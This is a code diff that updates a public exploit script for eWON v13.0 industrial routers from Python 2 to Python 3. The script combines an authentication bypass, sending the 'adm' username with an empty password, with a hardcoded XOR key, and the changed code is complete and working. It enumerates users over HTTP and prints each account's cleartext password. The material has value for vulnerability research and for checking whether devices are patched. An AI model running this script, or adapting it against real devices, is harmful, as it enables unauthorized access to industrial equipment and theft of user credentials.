@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 # -*- coding: utf-8 -*- 
 ''' 
     # Exploit Title: eWON v13.0 Authentication Bypass
@@ -36,55 +36,58 @@
         It combines two vulnerabilities: authentication bypass (fixed in 13.1s0)
           and a weak password encryption, allowing cleartext password retrievel for all users (fixed in 13.3s0)       
 '''
-username = 'adm'
+username = b'adm'
 
-import urllib2,urllib,base64,binascii,os
+import urllib.request, urllib.parse, base64, sys
 
 def decode(encpass):
-    xorString = "6414FE6F4C964746900208FC9B3904963A2F61"
-    def convertPass(password):
-        if (len(password)/2) > 19:
+    bXorString = bytes.fromhex('6414FE6F4C964746900208FC9B3904963A2F61')
+    def decodePass(bPass):
+        if len(bPass) > 19:
             print('Error, password can not exceed 19 characters')
-            exit()
-        return hexxor(password, xorString[:len(password)])
-    def hexxor(a, b):
-        return "".join(["%x" % (int(x,16) ^ int(y,16)) for (x, y) in zip(a, b)])
-    if encpass.startswith('#_'):
-        encpass = encpass.split('_')[2]
-    coded = base64.b64decode(encpass)
-    codedhex = binascii.hexlify(coded)[:-4]
-    clearpass = binascii.unhexlify(convertPass(codedhex))
-    print('Decoded password: ' + clearpass)
+            return ''
+        sClearPass = ''
+        for i in range (len(bPass)): sClearPass+= chr(bPass[i] ^ bXorString[i])
+        return sClearPass
+    if encpass.startswith('#_'): encpass = encpass.split('_')[2]
+    sEncodedPass = base64.b64decode(encpass)[:-2] ## last two bytes are checksum
+    print('Decoded password:       {}'.format(decodePass(sEncodedPass)))
 
-def getUserData(userid, strIP):
-    postwsdlist = '["inf_HasJVM","usr_FirstName|1","usr_LastName|1","usr_Login|1","usr_Password|1","usr_Information|1","usr_Right|1","usr_AccessPage|1","usr_AccessDir|1","usr_CBEn|1","usr_CBMode|1","usr_CBPhNum|1","ols_AllAndAssignedPageList","ols_DirList","ols_CBMode"]'
-    postwsdlist = postwsdlist.replace('|1','|'+str(userid))
-    postdata = {'wsdList' : postwsdlist}
-    b64auth = base64.b64encode(username+':').replace('=','')
-    result = urllib2.urlopen(urllib2.Request('http://'+strIP+'/wrcgi.bin/wsdReadForm',data=urllib.urlencode(postdata) ,headers={'Authorization' : ' Basic '+b64auth})).read()
-    resultarr = result.split('","')
+def getUserData(userid, strIP, sAuthHeader):
+    sURL = 'http://{}/wrcgi.bin/wsdReadForm'.format(strIP)
+    oHeaders = {'Authorization':'Basic {}'.format(sAuthHeader)}
+    sPostList = r'["inf_HasJVM","usr_FirstName|1","usr_LastName|1","usr_Login|1","usr_Password|1","usr_Information|1","usr_Right|1","usr_AccessPage|1","usr_AccessDir|1","usr_CBEn|1","usr_CBMode|1","usr_CBPhNum|1","ols_AllAndAssignedPageList","ols_DirList","ols_CBMode"]'
+    sPostList = sPostList.replace(r'|1',r'|'+str(userid))
+    oData = {'wsdList' : sPostList}
+    oData = urllib.parse.urlencode(oData).encode()
+    oRequest = urllib.request.Request(sURL, headers = oHeaders, data = oData)
+    #oRequest.set_proxy('127.0.0.1:8080','http')
+    oResponse  = urllib.request.urlopen(oRequest)
+    resultarr = oResponse.read().split(b'","')
     if len(resultarr) == 20:
-        fname = str(resultarr[1])
-        lname = str(resultarr[2])
-        usern = str(resultarr[3])
-        if len(usern) == 0:
-            return True
+        fname = resultarr[1].decode()
+        lname = resultarr[2].decode()
+        usern = resultarr[3].decode()
+        if len(usern) == 0: return True
         encpassword = resultarr[4]
-        print('Decoding pass for user: '+usern+' ('+fname+' '+lname+') ')
-        decode(encpassword)
+        print('Decoding pass for user: {} ({} {}) '.format(usern, fname, lname))
+        decode(encpassword.decode())
         print('---')
-        return True
-    else:
-        return True
+    return True
 
-strIP = raw_input('Please enter an IP [10.0.0.53]: ')
-if strIP == '': strIP = '10.0.0.53'
-print('---')
+if len(sys.argv) >= 2:
+    strIP = sys.argv[1]
+else:
+    strIP = input('Please enter an IP [10.0.0.53]: ')
+    if strIP == '': strIP = '10.0.0.53'
+    print('---')
 
-for i in range(20):
-    if not getUserData(i, strIP):
+sAuthHeader = base64.b64encode(username + b':').strip(b'=').decode()
+
+for i in range(1, 20):
+    if not getUserData(i, strIP, sAuthHeader):
         print('### That\'s all folks ;-) ###')
-        raw_input()
+        input()
         exit(0)
         
-raw_input('All Done')
+if len(sys.argv) < 2: input('All Done')
